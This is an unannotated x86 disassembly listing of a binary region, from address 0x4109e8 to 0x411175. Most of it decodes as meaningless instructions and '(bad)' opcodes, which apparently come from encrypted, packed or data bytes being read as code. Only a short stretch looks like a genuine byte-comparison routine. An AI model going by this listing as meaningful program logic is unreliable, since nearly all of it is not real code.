  4109e8:	or     eax,0xd58b8c53
  4109ed:	mov    edi,0xc9e1a82d
  4109f2:	xor    eax,0x6f0fafd8
  4109f7:	(bad)  
  4109f8:	push   edx
  4109f9:	add    BYTE PTR [eax+0x2e],dh
  4109fc:	jb     0x410a73
  4109fe:	popa   
  4109ff:	lea    eax,[esi-0x69]
  410a02:	mov    esi,0xc8504772
  410a07:	xor    DWORD PTR ss:[ebp-0x474f9fd7],esi
  410a0e:	or     BYTE PTR [edx+ecx*2-0x6e60e8bb],0x4a
  410a16:	and    dl,BYTE PTR [edx]
  410a18:	sub    edi,esi
  410a1a:	mov    dl,0x83
  410a1c:	sub    ch,BYTE PTR [esi+0x7e5e9503]
  410a22:	jp     0x410a39
  410a24:	adc    DWORD PTR [eax+0x504ea747],edx
  410a2a:	mov    cl,0xde
  410a2c:	and    eax,0x3b2a1aa2
  410a31:	nop
  410a32:	je     0x410a87
  410a34:	and    ecx,DWORD PTR [esi]
  410a36:	push   ds
  410a37:	sub    BYTE PTR [ebx],ah
  410a39:	les    ebx,FWORD PTR [edi]
  410a3b:	mov    ds:0xc9e9c603,al
  410a40:	add    al,BYTE PTR [eax]
  410a42:	add    BYTE PTR [edx],al
  410a44:	xor    ah,BYTE PTR [esp+ebx*8+0x74]
  410a48:	push   0xc758f082
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	(bad)  
  410a50:	call   0x7e7e:0xbdbaba91
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a6c
  410a5c:	outs   dx,BYTE PTR ds:[esi]
  410a5d:	stc    
  410a5e:	mov    ds:0xd415ec01,al
  410a63:	xchg   esi,eax
  410a64:	cmp    BYTE PTR [ebx-0x7a51a06c],bh
  410a6a:	hlt    
  410a6b:	jns    0x410a8b
  410a6d:	ret    
  410a6e:	or     BYTE PTR [ebp-0x2a],dl
  410a71:	hlt    
  410a72:	mov    ebp,0x27114348
  410a77:	pop    ss
  410a78:	cmp    ebp,esi
  410a7a:	sub    ah,BYTE PTR [bp+di]
  410a7d:	ret    
  410a7e:	(bad)  
  410a7f:	sbb    eax,0xc6442160
  410a84:	ror    BYTE PTR [ecx],1
  410a86:	neg    bl
  410a88:	mov    dh,0x46
  410a8a:	cmp    edi,ecx
  410a8c:	into   
  410a8d:	fs out 0xf6,al
  410a90:	in     al,dx
  410a91:	addr16 mov al,0x33
  410a94:	mov    dl,0x71
  410a96:	mov    ch,0xee
  410a98:	xor    dl,bh
  410a9a:	test   DWORD PTR [edi+0x1],ebx
  410a9d:	mov    ?,ecx
  410a9f:	fcmovnu st,st(4)
  410aa1:	lods   al,BYTE PTR cs:[esi]
  410aa3:	pop    edi
  410aa4:	dec    edx
  410aa5:	cmp    DWORD PTR [esi-0x586bf005],0xffffffc5
  410aac:	inc    BYTE PTR [eax+eiz*2+0x32c6ee08]
  410ab3:	push   ecx
  410ab4:	das    
  410ab5:	mov    ebx,DWORD PTR [esi+ebx*8]
  410ab8:	fwait
  410ab9:	inc    esi
  410aba:	ins    BYTE PTR es:[edi],dx
  410abb:	out    dx,eax
  410abc:	jle    0x410ab7
  410abe:	mov    BYTE PTR [edi+0x7a],al
  410ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ac2:	dec    DWORD PTR [eax]
  410ac4:	(bad)
  410ac7:	enter  0x2729,0x73
  410acb:	or     al,0x2f
  410acd:	mov    ch,0xa7
  410acf:	push   edi
  410ad0:	xchg   esi,eax
  410ad1:	jge    0x410ac0
  410ad3:	test   DWORD PTR [edi+ebp*2-0x6903b994],ecx
  410ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410adb:	(bad)  
  410add:	sub    esi,esi
  410adf:	lds    ebx,FWORD PTR [ecx+0x2f]
  410ae2:	(bad)
  410ae5:	shr    DWORD PTR [edx-0x1b],1
  410ae8:	mov    es,WORD PTR ds:0x8e2c07e2
  410aee:	cld    
  410aef:	cmc    
  410af0:	cmp    dl,BYTE PTR [edx+0x73523a01]
  410af6:	push   0x62
  410af8:	repz jns 0x410b0d
  410afb:	shl    BYTE PTR [esi+ecx*8+0xde9f4e1],cl
  410b02:	pusha  
  410b03:	into   
  410b04:	sbb    esi,esp
  410b06:	pop    edi
  410b07:	cmp    dh,bh
  410b09:	xchg   ebp,eax
  410b0a:	(bad)  
  410b0c:	loopne 0x410b4d
  410b0e:	mov    al,0xf9
  410b10:	jecxz  0x410b70
  410b12:	(bad)  
  410b13:	and    eax,DWORD PTR [eax+0x4da755aa]
  410b19:	xchg   esp,eax
  410b1a:	jnp    0x410b4d
  410b1c:	dec    DWORD PTR [eax]
  410b1e:	jbe    0x410ace
  410b20:	out    0x5a,eax
  410b22:	xor    ecx,ebx
  410b24:	push   esi
  410b25:	test   eax,0x6dc9dde7
  410b2a:	and    ebp,DWORD PTR [eax-0x13]
  410b2d:	lods   eax,DWORD PTR ds:[esi]
  410b2e:	push   ss
  410b2f:	gs nop
  410b31:	popa   
  410b32:	pop    eax
  410b33:	mov    esp,0x9cd176ab
  410b38:	rcr    BYTE PTR [esi],0xf5
  410b3b:	mov    ah,0x51
  410b3d:	data16 jecxz 0x410b20
  410b40:	loop   0x410b24
  410b42:	(bad)  
  410b43:	sar    DWORD PTR [edi],cl
  410b45:	retf   
  410b46:	pmulhuw mm6,mm3
  410b49:	leave  
  410b4a:	in     eax,0x6d
  410b4c:	xlat   BYTE PTR ds:[ebx]
  410b4d:	jl     0x410b46
  410b4f:	popa   
  410b50:	cli    
  410b51:	fidiv  WORD PTR [ebp+eax*2-0x4a27e921]
  410b58:	adc    bh,dh
  410b5a:	bound  eax,QWORD PTR [esi+0x3bafaaf2]
  410b60:	push   edx
  410b61:	rcr    BYTE PTR [eax+esi*4+0x46],cl
  410b65:	jns    0x410b9c
  410b67:	test   DWORD PTR [ebx+0x2c],ebp
  410b6a:	stc    
  410b6b:	push   ebp
  410b6c:	pop    edi
  410b6d:	(bad)  
  410b6e:	ja     0x410b44
  410b70:	and    ecx,ebx
  410b72:	inc    eax
  410b73:	add    eax,eax
  410b75:	pushf  
  410b76:	mov    al,0xa3
  410b78:	mov    bh,bh
  410b7a:	mov    ch,0x96
  410b7c:	pop    esi
  410b7d:	lock repz popa 
  410b80:	push   0x52
  410b82:	ror    BYTE PTR [ebp-0x5e],0x13
  410b86:	push   esi
  410b87:	aas    
  410b88:	pop    esi
  410b89:	loope  0x410bbc
  410b8b:	nop
  410b8c:	xchg   edi,eax
  410b8d:	pop    esp
  410b8e:	mov    edx,0xe6f465ee
  410b93:	jg     0x410c12
  410b95:	pop    edx
  410b96:	and    al,0x5
  410b98:	or     eax,0xa5d72329
  410b9d:	xchg   edx,eax
  410b9e:	ret    0x7339
  410ba1:	jge    0x410bda
  410ba3:	jo     0x410bcf
  410ba5:	daa    
  410ba6:	mov    eax,ds:0xde0dd51d
  410bab:	cdq    
  410bac:	xor    BYTE PTR [ebx-0x25],bh
  410baf:	in     eax,0x95
  410bb1:	sahf   
  410bb2:	femms  
  410bb4:	outs   dx,DWORD PTR ds:[esi]
  410bb5:	in     al,dx
  410bb6:	xchg   BYTE PTR [ebx-0x2c],dl
  410bb9:	je     0x410b72
  410bbb:	leave  
  410bbc:	push   edi
  410bbd:	(bad)  
  410bbe:	pushf  
  410bbf:	push   eax
  410bc0:	ror    DWORD PTR ss:[edx+0x639b323f],0xf6
  410bc8:	push   cs
  410bc9:	test   eax,0x9f289135
  410bce:	and    edi,DWORD PTR [ebx]
  410bd0:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  410bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bd3:	nop
  410bd4:	iret   
  410bd5:	arpl   WORD PTR [edi],ax
  410bd7:	jmp    0x410bad
  410bd9:	pop    edi
  410bda:	mov    BYTE PTR [edi-0x4ef2213f],dl
  410be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be1:	loope  0x410b8a
  410be3:	inc    edx
  410be4:	retf   0x869b
  410be7:	jbe    0x410c10
  410be9:	mov    ebx,0xc721f66c
  410bee:	into   
  410bef:	hlt    
  410bf0:	fcom   DWORD PTR [ecx+ecx*8]
  410bf3:	xlat   BYTE PTR ds:[ebx]
  410bf4:	neg    DWORD PTR [esp+eax*1]
  410bf7:	in     eax,dx
  410bf8:	and    DWORD PTR [ebp-0xa04d546],edx
  410bfe:	loopne 0x410c25
  410c00:	mov    bh,0x62
  410c02:	iret   
  410c03:	(bad)  
  410c04:	(bad)  
  410c06:	(bad)  
  410c08:	mov    bl,0xad
  410c0a:	xor    DWORD PTR [esi-0x4f],ebx
  410c0d:	adc    eax,DWORD PTR [ebp+ebx*8-0x62]
  410c11:	addr16 push ebx
  410c13:	cwde   
  410c14:	jbe    0x410bf0
  410c16:	cmp    BYTE PTR [edi],dl
  410c18:	xchg   ebp,eax
  410c19:	stc    
  410c1a:	or     al,0x2f
  410c1c:	sub    ebp,DWORD PTR [esi+ebx*1-0x32]
  410c20:	adc    eax,0x1ca19464
  410c25:	jnp    0x410beb
  410c27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c28:	scas   al,BYTE PTR es:[edi]
  410c29:	in     al,dx
  410c2a:	dec    eax
  410c2b:	(bad)  
  410c2c:	scas   al,BYTE PTR es:[edi]
  410c2d:	imul   esp,eax,0xe8579f29
  410c33:	jo     0x410be0
  410c35:	mov    ah,0xa6
  410c37:	mov    BYTE PTR [ebp+edi*2-0x62429c05],ch
  410c3e:	xor    esi,DWORD PTR [esp+esi*1]
  410c41:	arpl   WORD PTR [edi+edi*1],si
  410c44:	(bad)  
  410c45:	mov    ?,WORD PTR [ecx+0x7f743fe6]
  410c4b:	cmp    ebx,DWORD PTR [eax+0x1b0cf67f]
  410c51:	aam    0x77
  410c53:	xor    esi,DWORD PTR [edx+ebp*8+0x2740b2d5]
  410c5a:	adc    ah,ch
  410c5c:	push   ebx
  410c5d:	hlt    
  410c5e:	imul   ecx,DWORD PTR [ebp-0x62],0xffffffa9
  410c62:	repnz loopne 0x410be8
  410c65:	xchg   esi,eax
  410c66:	xchg   BYTE PTR [ebx+ecx*1-0x79391c9f],cl
  410c6d:	fnclex 
  410c6f:	inc    ecx
  410c70:	xor    ebx,0x6ccb7b
  410c76:	cmp    al,0xa0
  410c78:	or     al,0xde
  410c7a:	test   eax,0xd0b081d7
  410c7f:	pop    esp
  410c80:	push   edi
  410c81:	xchg   edi,eax
  410c82:	shr    BYTE PTR [esi-0x32],1
  410c85:	or     BYTE PTR [ecx+0x6201284e],ch
  410c8b:	in     al,dx
  410c8c:	pop    edi
  410c8d:	arpl   WORD PTR [edx-0x38],bp
  410c90:	scas   al,BYTE PTR es:[edi]
  410c91:	cmp    eax,0x10d43775
  410c96:	jmp    0x3a0e0eae
  410c9b:	mov    cl,BYTE PTR [esi+0x73be7c06]
  410ca1:	jnp    0x410c38
  410ca3:	enter  0xc29f,0xf8
  410ca7:	fs jbe 0x410d27
  410caa:	lahf   
  410cab:	mov    bh,0xbd
  410cad:	(bad)  
  410cae:	mov    ch,0x8a
  410cb0:	cmp    ah,BYTE PTR [edx+edi*8+0x12]
  410cb4:	mov    ecx,0xebcacd30
  410cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cba:	(bad)  
  410cbb:	and    BYTE PTR [ecx],cl
  410cbd:	fmul   DWORD PTR [eax+0x10949915]
  410cc3:	mov    bl,0x29
  410cc5:	jmp    0x410cf5
  410cc7:	lea    ebp,[ebx-0x57cd9dc0]
  410ccd:	leave  
  410cce:	xor    ch,bh
  410cd0:	jb     0x410cf8
  410cd2:	mov    al,ds:0x1325f699
  410cd7:	sahf   
  410cd8:	arpl   si,dx
  410cda:	imul   eax,DWORD PTR [ebp-0x42],0xc7b2532c
  410ce1:	in     al,0x6
  410ce3:	sahf   
  410ce4:	jmp    0xf545:0x1eae61da
  410ceb:	push   ebp
  410cec:	loope  0x410d06
  410cee:	cmp    al,0xc0
  410cf0:	mov    cl,0xaf
  410cf2:	mov    al,ds:0x56873a4a
  410cf7:	shr    ecx,cl
  410cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cfa:	cdq    
  410cfb:	jle    0x410c8a
  410cfd:	loop   0x410c97
  410cff:	mov    DWORD PTR [edi-0x33],ebp
  410d02:	mov    WORD PTR [edx-0x38],?
  410d05:	mov    ds:0x71182a7f,eax
  410d0a:	clc    
  410d0b:	test   DWORD PTR [ecx-0x7ba74fe],0x2c9e9
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x6eaa439c
  410d25:	jp     0x410d12
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	and    DWORD PTR [edx-0x760a8777],ebp
  410d34:	in     al,dx
  410d35:	and    BYTE PTR ds:[edi+0x4c],al
  410d39:	push   esp
  410d3a:	call   DWORD PTR [edx-0x6a]
  410d3d:	clc    
  410d3e:	loopne 0x410d8a
  410d40:	sub    al,0x24
  410d42:	(bad)  
  410d43:	pop    ss
  410d44:	inc    edi
  410d45:	outs   dx,DWORD PTR ds:[esi]
  410d46:	fld    QWORD PTR [ecx-0x6a27a221]
  410d4c:	cmc    
  410d4d:	mov    dh,0xcf
  410d4f:	mov    edi,0x83ce2964
  410d54:	inc    edx
  410d55:	cs jecxz 0x410d51
  410d58:	add    ebx,DWORD PTR [ecx+0x671d8c7f]
  410d5e:	mov    al,ds:0x349b638
  410d63:	xor    ah,ch
  410d65:	js     0x410d21
  410d67:	jle    0x410d5f
  410d69:	bound  ebp,QWORD PTR [esi-0x41]
  410d6c:	mov    fs,WORD PTR [ebx-0x7bdd7bb1]
  410d72:	rol    ah,1
  410d74:	aaa    
  410d75:	sti    
  410d76:	int    0xe2
  410d78:	xor    DWORD PTR [ebx+0x19],ebx
  410d7b:	push   ecx
  410d7c:	ss inc esp
  410d7e:	(bad)
  410d81:	fmul   DWORD PTR [ebp-0x29]
  410d84:	adc    esp,ecx
  410d86:	adc    eax,0xb9012d25
  410d8b:	ja     0x410d2b
  410d8d:	sbb    al,0x88
  410d8f:	sub    BYTE PTR [ecx+0x41c70620],bl
  410d95:	jae    0x410e02
  410d97:	shl    edi,0x12
  410d9a:	add    eax,0xe8845df8
  410d9f:	pop    ecx
  410da0:	stos   DWORD PTR es:[edi],eax
  410da1:	pop    eax
  410da2:	sbb    ch,BYTE PTR [eax-0x475c1fef]
  410da8:	cmc    
  410da9:	cmp    DWORD PTR [eax+0x3735097f],ebp
  410daf:	add    dh,cl
  410db1:	inc    edi
  410db2:	push   esp
  410db3:	adc    BYTE PTR fs:[si-0x1364],0x4b
  410dba:	mov    bh,0x93
  410dbc:	pop    esi
  410dbd:	sahf   
  410dbe:	add    BYTE PTR [edi-0x9],dh
  410dc1:	dec    edi
  410dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc3:	inc    eax
  410dc4:	aas    
  410dc5:	cmp    al,0x97
  410dc7:	sbb    eax,0x75ae6978
  410dcc:	out    dx,eax
  410dcd:	lods   al,BYTE PTR ds:[esi]
  410dce:	and    BYTE PTR [edi-0x739c695f],al
  410dd4:	out    dx,eax
  410dd5:	pop    es
  410dd6:	icebp  
  410dd7:	sub    ch,ch
  410dd9:	jmp    0x410daa
  410ddb:	adc    ecx,DWORD PTR [edi-0x594eaee1]
  410de1:	xor    edi,0xffffffbf
  410de4:	clc    
  410de5:	cld    
  410de6:	aam    0xa8
  410de8:	mov    ecx,0x7b009ca6
  410ded:	push   cs
  410dee:	js     0x410d89
  410df0:	jo     0x410e19
  410df2:	out    dx,eax
  410df3:	retf   0xef64
  410df6:	xchg   ebx,eax
  410df7:	add    DWORD PTR [ebx+0x67],0x14
  410dfb:	xchg   ebp,eax
  410dfc:	mov    edx,0x1ce59f78
  410e01:	lds    ecx,FWORD PTR [edi-0x66]
  410e04:	mov    eax,ds:0xee7da371
  410e09:	xchg   esi,eax
  410e0a:	mov    edi,0x1947e6f9
  410e0f:	mov    edx,DWORD PTR [eax]
  410e11:	sbb    edi,ebp
  410e13:	fldcw  WORD PTR [esi-0x6b0f83b]
  410e19:	xor    BYTE PTR [edx+ebx*1],0xb8
  410e1d:	or     cl,BYTE PTR [eax+0x19]
  410e20:	dec    eax
  410e21:	lock jg 0x410db4
  410e24:	inc    edx
  410e25:	jmp    0x5d90:0x77d9be82
  410e2c:	sbb    al,0x50
  410e2e:	inc    edx
  410e2f:	add    bl,dl
  410e31:	jp     0x410e70
  410e33:	pop    esp
  410e34:	push   ecx
  410e35:	cmp    DWORD PTR [ebx-0x30],esi
  410e38:	inc    sp
  410e3a:	mov    ebx,esp
  410e3c:	pop    esp
  410e3d:	mov    eax,ds:0x87a5fabe
  410e42:	les    esp,FWORD PTR [ebp-0x66]
  410e45:	xchg   BYTE PTR [ebx],bl
  410e47:	(bad)  
  410e48:	retf   
  410e49:	xor    al,0xb8
  410e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e4c:	push   cs
  410e4d:	adc    ebp,DWORD PTR [edx+0x43]
  410e50:	mov    ebx,0xcf649bde
  410e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e56:	xchg   edi,eax
  410e57:	sti    
  410e58:	and    ebp,esp
  410e5a:	cs (bad) 
  410e5c:	fst    QWORD PTR [esi+0x72bdc42f]
  410e62:	adc    eax,0xbd4d6f4c
  410e67:	out    0xa6,al
  410e69:	cmp    edx,edx
  410e6b:	imul   BYTE PTR [ebx]
  410e6d:	mov    bl,ch
  410e6f:	jnp    0x410e45
  410e71:	sub    DWORD PTR [edx],esp
  410e73:	mov    eax,0xd3b33924
  410e78:	fsub   QWORD PTR ss:[esi+0x1a]
  410e7c:	out    dx,eax
  410e7d:	stos   BYTE PTR es:[edi],al
  410e7e:	daa    
  410e7f:	jb     0x410ea5
  410e81:	ins    BYTE PTR es:[edi],dx
  410e82:	mov    edi,0x54fc3a91
  410e87:	imul   esp,DWORD PTR [esi],0xffffffde
  410e8a:	scas   al,BYTE PTR es:[edi]
  410e8b:	enter  0x4e80,0x91
  410e8f:	dec    esi
  410e90:	xchg   edi,eax
  410e91:	ss dec ebp
  410e93:	inc    esp
  410e94:	repz int3 
  410e96:	jo     0x410eff
  410e98:	stc    
  410e99:	xor    BYTE PTR [ebx],0x86
  410e9c:	cmp    eax,0x740f233a
  410ea1:	pop    ds
  410ea2:	std    
  410ea3:	loopne 0x410e2e
  410ea5:	adc    DWORD PTR [ebx+0x1ff2e734],edi
  410eab:	sub    eax,0x2367c099
  410eb0:	sub    eax,0xa96d6dcf
  410eb5:	or     BYTE PTR [edx+0x55ddc82a],ch
  410ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ebc:	stos   DWORD PTR es:[edi],eax
  410ebd:	dec    edi
  410ebe:	xchg   edi,eax
  410ebf:	hlt    
  410ec0:	adc    cl,ah
  410ec2:	mov    es,WORD PTR [eax]
  410ec4:	fcom   st(2)
  410ec6:	imul   esi,DWORD PTR [ecx+0xbcad2e1],0x27c60303
  410ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ed1:	out    dx,al
  410ed2:	jp     0x410f24
  410ed4:	sbb    BYTE PTR [esi-0x74ecd4b2],0xac
  410edb:	stos   DWORD PTR es:[edi],eax
  410edc:	leave  
  410edd:	mov    al,0xb0
  410edf:	lds    eax,FWORD PTR [edx]
  410ee1:	mov    bh,0xca
  410ee3:	repnz push ss
  410ee5:	out    0xe,eax
  410ee7:	cmp    ebp,esi
  410ee9:	adc    dh,cl
  410eeb:	loopne 0x410eef
  410eed:	sub    DWORD PTR [ebx+0x42433b8],0xf99583ae
  410ef7:	arpl   dx,bx
  410ef9:	sub    BYTE PTR [esi],bl
  410efb:	fnstsw WORD PTR [edx-0x46]
  410efe:	movzx  edi,WORD PTR [esi]
  410f01:	mov    ebx,0x7953a4f1
  410f06:	das    
  410f07:	adc    bl,ch
  410f09:	repz xchg esi,eax
  410f0b:	(bad)  
  410f0c:	pusha  
  410f0d:	add    DWORD PTR [esp+ebx*2-0x65fddd7e],ebx
  410f14:	scas   al,BYTE PTR es:[edi]
  410f15:	push   es
  410f16:	mov    ah,0x3d
  410f18:	not    BYTE PTR [esi+0x56be48c6]
  410f1e:	pop    ds
  410f1f:	ret    
  410f20:	fnsave [eax+edx*8]
  410f23:	fwait
  410f24:	lds    ebp,FWORD PTR [eax]
  410f26:	stos   DWORD PTR es:[edi],eax
  410f27:	jnp    0x410f69
  410f29:	mov    ebp,0x3bf43313
  410f2e:	out    dx,eax
  410f2f:	ins    DWORD PTR es:[edi],dx
  410f30:	test   eax,0x612bb160
  410f35:	or     edi,DWORD PTR [edx-0x729d5749]
  410f3b:	aas    
  410f3c:	mov    ebp,0xdef63244
  410f41:	outs   dx,DWORD PTR ds:[esi]
  410f42:	test   al,0x39
  410f44:	jle    0x410f8a
  410f46:	pop    ds
  410f47:	and    al,0xd7
  410f49:	(bad)  
  410f4a:	mov    eax,ds:0xfdc47e91
  410f4f:	sbb    bl,ah
  410f51:	addr16 sub al,0x35
  410f54:	push   0x2bad1804
  410f59:	in     al,dx
  410f5a:	and    BYTE PTR [ebx],dl
  410f5c:	mov    al,0xe4
  410f5e:	fadd   st(0),st
  410f60:	pop    ebp
  410f61:	cdq    
  410f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f63:	rcr    BYTE PTR [ebx-0x26],1
  410f66:	fldenv [ebp+0x49e3b815]
  410f6c:	stos   DWORD PTR es:[edi],eax
  410f6d:	xchg   edx,eax
  410f6e:	add    DWORD PTR [edi-0x50],eax
  410f71:	mov    WORD PTR [ebx+0x3a38b7d3],ds
  410f77:	imul   edi,DWORD PTR [edi-0x3b4e4847],0xaaf4ddb6
  410f81:	int3   
  410f82:	stos   BYTE PTR es:[edi],al
  410f83:	loope  0x410f0d
  410f85:	xor    eax,0xba32f39d
  410f8a:	nop
  410f8b:	leave  
  410f8c:	(bad)  
  410f8d:	or     DWORD PTR [ebp-0x425818c6],ebp
  410f93:	js     0x410f79
  410f95:	jp     0x410f92
  410f97:	(bad)  
  410f98:	fiadd  WORD PTR [esi+0x52ee292c]
  410f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f9f:	inc    edx
  410fa0:	test   esi,eax
  410fa2:	jb     0x410fef
  410fa4:	sub    DWORD PTR [ecx+eax*1-0x567afd7],edi
  410fab:	mov    cl,al
  410fad:	call   0xcf9d8cd6
  410fb2:	push   ecx
  410fb3:	jns    0x410f36
  410fb5:	mov    esi,0xf6e54860
  410fba:	and    al,0x1a
  410fbc:	push   edx
  410fbd:	loope  0x410fcd
  410fbf:	cmp    ecx,DWORD PTR [edi+0x73]
  410fc2:	gs mov gs,esp
  410fc5:	xor    al,0x58
  410fc7:	mov    ah,0xa5
  410fc9:	cs js  0x411027
  410fcc:	shl    BYTE PTR [esi],cl
  410fce:	bound  ecx,QWORD PTR [edx+ebp*8+0x5d]
  410fd2:	outs   dx,BYTE PTR ds:[esi]
  410fd3:	or     eax,0xd779eaaf
  410fd8:	push   ecx
  410fd9:	sbb    eax,0x742d97c1
  410fde:	inc    ecx
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411086
  41102b:	cs add al,0x2e
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x411010
  411037:	(bad)  
  411038:	mov    bl,0x98
  41103a:	dec    ebp
  41103b:	cwde   
  41103c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41103d:	cld    
  41103e:	outs   dx,DWORD PTR ds:[esi]
  41103f:	push   edi
  411040:	aam    0xe7
  411042:	sbb    ah,BYTE PTR [edx+0x2d6eb5]
  411048:	popf   
  411049:	ror    BYTE PTR [ebx],cl
  41104b:	lea    esi,[ebp-0x1f]
  41104e:	xor    BYTE PTR [edi+eax*4+0x31ddcbe3],al
  411055:	(bad)  
  411057:	test   al,0x13
  411059:	ins    BYTE PTR es:[edi],dx
  41105a:	mov    ch,0xc9
  41105c:	cwde   
  41105d:	(bad)  
  41105e:	push   ecx
  41105f:	mov    DWORD PTR [edi+0x3b42c70],esi
  411065:	pop    ss
  411066:	aam    0xda
  411068:	je     0x411079
  41106a:	jne    0x411093
  41106c:	cs jmp 0xcd41:0x8bba35d4
  411074:	test   al,0x1e
  411076:	and    al,0x1e
  411078:	popa   
  411079:	and    esp,DWORD PTR ds:0xfd270999
  41107f:	retf   
  411080:	cmp    al,0xf6
  411082:	adc    eax,0x777bcb4a
  411087:	mov    ch,0x4a
  411089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41108a:	nop
  41108b:	outs   dx,DWORD PTR ds:[esi]
  41108c:	cmp    BYTE PTR [edi+0x44],ch
  41108f:	jecxz  0x4110bb
  411091:	out    dx,eax
  411092:	xchg   DWORD PTR [edi],esp
  411094:	xor    al,0x9c
  411096:	mov    ebx,DWORD PTR [eax+0x31e715eb]
  41109c:	push   ds
  41109d:	sbb    al,0x85
  41109f:	in     eax,0xee
  4110a1:	shl    DWORD PTR [edx+ebx*8+0x6c],0x87
  4110a6:	sbb    al,0x0
  4110a8:	xchg   esp,eax
  4110a9:	lds    edi,FWORD PTR ds:0xacb5fd70
  4110af:	mov    esi,0x61c38ffc
  4110b4:	push   ebx
  4110b5:	or     BYTE PTR [edi+0x2e],dl
  4110b8:	pop    ss
  4110b9:	les    esi,FWORD PTR [ebx+0x7]
  4110bc:	jb     0x411043
  4110be:	fldcw  WORD PTR [ebx]
  4110c0:	pop    esi
  4110c1:	add    eax,0xeb9189a8
  4110c6:	daa    
  4110c7:	xor    DWORD PTR [esi],esp
  4110c9:	fwait
  4110ca:	pop    es
  4110cb:	loop   0x411118
  4110cd:	scas   al,BYTE PTR es:[edi]
  4110ce:	xchg   edi,eax
  4110cf:	shr    DWORD PTR [edx],0xd3
  4110d2:	adc    esi,DWORD PTR [edi+ebp*4-0x39]
  4110d6:	shl    DWORD PTR [edi+0x21],cl
  4110d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110da:	cwde   
  4110db:	jmp    0x411097
  4110dd:	imul   eax,DWORD PTR [edx],0xffffffcd
  4110e0:	stos   BYTE PTR es:[edi],al
  4110e1:	jle    0x4110c9
  4110e3:	lock lods eax,DWORD PTR ds:[esi]
  4110e5:	(bad)
  4110e8:	fmul   QWORD PTR [ebx-0x45812d2]
  4110ee:	fist   WORD PTR [esi+0x196ff8ba]
  4110f4:	xor    al,0xee
  4110f6:	call   0x6eb7d885
  4110fb:	push   eax
  4110fc:	loop   0x411171
  4110fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110ff:	pop    eax
  411100:	push   edx
  411101:	inc    ebp
  411102:	push   esp
  411103:	push   edi
  411104:	ficomp WORD PTR [ebx-0x47]
  411107:	sahf   
  411108:	ret    0xd55f
  41110b:	inc    esi
  41110c:	mov    esi,ecx
  41110e:	mov    ?,WORD PTR [ecx]
  411110:	mov    DWORD PTR [ecx-0x3e],edx
  411113:	das    
  411114:	repz push ss
  411116:	sahf   
  411117:	adc    BYTE PTR [edx+0x5],bl
  41111a:	xchg   esi,eax
  41111b:	ret    
  41111c:	mov    bh,0xe8
  41111e:	xchg   edi,eax
  41111f:	stc    
  411120:	out    0x4f,al
  411122:	add    eax,0xa2ba7d91
  411127:	mov    edi,0xec328398
  41112c:	sahf   
  41112d:	sbb    eax,esi
  41112f:	and    ah,BYTE PTR [edx+edi*8+0x1b6c174e]
  411136:	repz mov ebp,edi
  411139:	adc    al,0x71
  41113b:	xor    al,0xd9
  41113d:	les    edx,FWORD PTR [ecx]
  41113f:	imul   ecx,esp,0xa2962bf6
  411145:	loop   0x41110b
  411147:	pop    ebp
  411148:	lds    esi,FWORD PTR [ecx+0x2a928995]
  41114e:	pop    edx
  41114f:	cli    
  411150:	dec    ebp
  411151:	sub    esp,ebp
  411153:	and    eax,0xa19c36c5
  411158:	mov    ebp,0x8faac736
  41115d:	sub    al,0x5c
  41115f:	push   es
  411160:	icebp  
  411161:	and    eax,0xdcdbe11e
  411166:	add    eax,0xf2ca730a
  41116b:	mov    WORD PTR [edi],fs
  41116d:	jmp    0x84614e41
  411172:	popa   
  411173:	loope  0x41119c
  411175:	rol    BYTE PTR [eax-0x22d952f3],0xf1
